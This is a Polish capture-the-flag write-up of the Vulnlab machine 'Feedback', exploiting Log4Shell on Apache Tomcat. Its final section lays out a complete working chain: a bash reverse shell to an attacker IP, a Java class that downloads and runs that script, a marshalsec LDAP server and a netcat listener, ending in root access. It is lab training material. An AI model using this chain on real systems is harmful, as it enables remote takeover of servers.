# Feedback
Linux,Easy, created by **xct**
![feedback_slide](https://github.com/user-attachments/assets/c7f34a5d-01b3-43cb-b7ad-db1a8ee62b82)

```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.56
```
```
ffuf -w ~/raft.txt  -u http://10.10.103.197:8080/FUZZ -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36' -mc all -fw 68,66

RELEASE-NOTES.txt       [Status: 200, Size: 6898, Words: 862, Lines: 175, Duration: 41ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 68ms]
favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 35ms]
feedback                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
index.jsp               [Status: 200, Size: 11136, Words: 4198, Lines: 199, Duration: 60ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]
```

Jak maszynka nazywa się `Feedback` i mamy katalog `feedback` to tam idę xd

![{E26EDA92-67DA-4483-95DD-8CAADE33A353}](https://github.com/user-attachments/assets/39262a51-0055-4ec4-ac66-ec82c9974d83)

![{C5D0A5A1-CCEB-4596-BC09-453794CF5593}](https://github.com/user-attachments/assets/78059483-8324-4bae-8be5-f57ba132d024)

Przy okazji 2021 rok wydania to trochę mi śmierdzi i czuję, że wiem jaka tam siedzi podatność
![{DCA91D6A-F144-49A2-ACAA-8F4A0A3082CA}](https://github.com/user-attachments/assets/f22f5b76-e24c-4950-bb43-1dba1de48f6f)

![{FFA53A71-3A52-4FCB-8648-80BE324A501B}](https://github.com/user-attachments/assets/e952a117-e2cb-40fd-bd1e-e1a4141388a7)

Bingo
- teraz przygotować exploit, a wiem, że w 2024 są z tym lekkie problemy.. (ja spróbuję z tym https://github.com/cybereason/Logout4Shell.git)

![{7D472CEE-78C0-4F4B-8A72-FEC16E3F9E22}](https://github.com/user-attachments/assets/5b0ef247-be6f-471d-b5df-10f0b9265e2f)

zaczyna się...

kolejna próba [https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)

![{18F81C88-8232-44B6-9B55-99DBFD8FCCEA}](https://github.com/user-attachments/assets/6229c2c0-baf4-4d9f-8559-50f0b5d8e426)

trzeba znaleźć staszą javę

![{49292569-82B7-4BBF-8C25-E2039685826E}](https://github.com/user-attachments/assets/1f3b2aec-99ce-49f8-b6bb-820ec8bddff6)

![{302ECB26-A8B8-4FE0-85E0-F53A2792C70E}](https://github.com/user-attachments/assets/494c4c26-cf8b-42ca-a42a-6f88b4636a80)

![{2FE8DED2-A475-4169-A53A-5B351909E96F}](https://github.com/user-attachments/assets/b56599a9-64b8-40dc-a1d9-bf4982b2fc10)

`library initialization failed - unable to allocate file descriptor table - out of memory`??????????

![{419698F3-6A22-43DD-A477-79C466314260}](https://github.com/user-attachments/assets/a38b0407-488f-4308-b577-36ab7af4ed8e)

powoli do przodu...

![{D495A742-ADF3-4C65-897C-3CDE7F75B3FB}](https://github.com/user-attachments/assets/25ff772f-fa79-48e6-ae2e-c655f9e0055f)

Dobra co ja tutaj przeszełem to nie mam pytań. Ostatni hard kosztował mnie mniej wysiłku.

![{204D1839-B065-4B0D-AF8E-80C640D6C2B2}](https://github.com/user-attachments/assets/70e2a69d-4657-47f0-acb3-85be91a7d1f6)

### INSTRUKCJA

najpierw pliczek `a`
```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.8.4.124/443 0>&1'
```

teraz pliczek Exploit.java
```
public class Exploit {
    static {
        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec("wget http://10.8.4.124/a -O /tmp/a");
            p.waitFor();
            r = Runtime.getRuntime();
            p = r.exec("/bin/bash /tmp/a");
            p.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public Exploit(){
        System.out.println("Pleeeeeease");
    }
}
```

teraz musimy mieć `jdk1.8.0_20/bin/javac` z oficjalnej strony javy.

kompilujmy
```
/home/kali/SHARED/vulnlab/Feedback/log4j-shell-poc/jdk1.8.0_20/bin/javac Exploit.java -source 8 -target 8
```

dwa serwery pythona sobie stawiamy
```
python3 -m http.server 8000
python3 -m http.server 80
```

odpalamy
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.4.124:8000/#Exploit"
```

ustawiamy listener
```
nc -lvnp 443
```
i na końcu wchodzimy na stronę

![{7E159FF4-D89C-4BF6-B124-C4C2B51EEE5D}](https://github.com/user-attachments/assets/ffac08b7-1f16-459a-a28b-d16add28c0fa)

Jakieś credsy dali

![{7939E0C3-8D40-4874-A5A9-842E54CD6D15}](https://github.com/user-attachments/assets/4346e438-65b2-4c1a-a101-63a78149fdb9)

![{2B666E8A-CAD8-468B-A445-9C6CD68F44D3}](https://github.com/user-attachments/assets/cb9b7396-367c-4f47-9f5f-253fe1e1ab66)

Hasło działa na roota.

FINISH
